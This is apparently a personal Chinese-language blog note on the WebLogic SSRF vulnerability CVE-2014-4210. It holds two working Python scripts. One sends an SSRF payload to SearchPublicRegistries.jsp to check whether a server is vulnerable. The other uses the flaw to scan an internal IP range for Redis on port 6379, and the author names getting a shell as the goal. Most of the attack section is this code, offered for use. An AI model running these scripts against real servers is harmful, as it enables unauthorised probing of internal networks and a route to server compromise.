---
title:weblogic ssrf 漏洞笔记
tags:weblogic
---



# [weblogic ssrf 漏洞笔记]



**CVE-2014-4210**

　　Oracle WebLogic web server即可以被外部主机访问，同时也允许访问内部主机。比如有一个jsp页面SearchPublicReqistries.jsp，我们可以利用它进行攻击，未经授权通过weblogic server连接任意主机的任意TCP 端口，可以能冗长的响应来推断在此端口上是否有服务在监听此端口。（ps:本人觉得挺鸡肋的，要是目标机没开redis的6379端口没法getshll了。当然也是自己太菜）

**1.weblogic_ssrf.py（仅能用来判断是否有该漏洞）**

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: weblogic SSRF漏洞(CVE-2014-4210)
referer: http://blog.gdssecurity.com/labs/2015/3/30/weblogic-ssrf-and-xss-cve-2014-4241-cve-2014-4210-cve-2014-4.html
author: Lucifer
description: weblogic 版本10.0.2 -- 10.3.6中SearchPublicRegistries.jsp，参数operator可传入内网IP造成SSRF漏洞
'''
import sys
import warnings
import requests
from termcolor import cprint

class weblogic_ssrf_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)

            if r"weblogic.uddi.client.structures.exception.XML_SoapException" in req.text and r"IO Exception on sendMessage" not in req.text:
                cprint("[+]存在weblogic SSRF漏洞...(中危)\tpayload: "+vulnurl, "yellow")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = weblogic_ssrf_BaseVerify(sys.argv[1])
    testVuln.run()
```



![](https://i.loli.net/2019/01/08/5c34357a4e719.png)



**2.利用UDDI Explorerc查看内网ip段**

　　如下图可知目标机的内网IP为127.0.0.1

![](https://i.loli.net/2019/01/08/5c3435d3aaec3.png)

**3.利用weblogic_redisscan.py扫描内网是否有6379端口，也就是redis服务**

```python
#!/usr/bin/python
    # -*- coding: utf-8 -*-
     
    import httplib
    import  time
    from colorama import init,Fore
    init(autoreset=True)
    ips = ['127.0.0.']
    for j in ips:
        for i in range(1,255):
            try:
                print Fore.BLUE+'[-]Check '+j+str(i)
                conn = httplib.HTTPSConnection('xx.bbbb.com',80,timeout=5)
                conn.request(method="GET",url="/uddiexplorer/SearchPublicRegistries.jsp?operator=http://"+j+str(i)+\
                            ":6379&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search")
                conn.getresponse().read()
                conn.close()
                try:
                    conn = httplib.HTTPSConnection('xx.bbbb.com',80,timeout=5)
                    conn.request(method="GET",url="/uddiexplorer/SearchPublicRegistries.jsp?operator=https://"+j+str(i)+\
                                ":6379&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search")
                    conn.getresponse().read()
                    conn.close()
                    time.sleep(4)
                except:
                    print Fore.RED+'[+] '+j+str(i)+':6379 is open'
                    time.sleep(4)
            except:
                time.sleep(4)
```



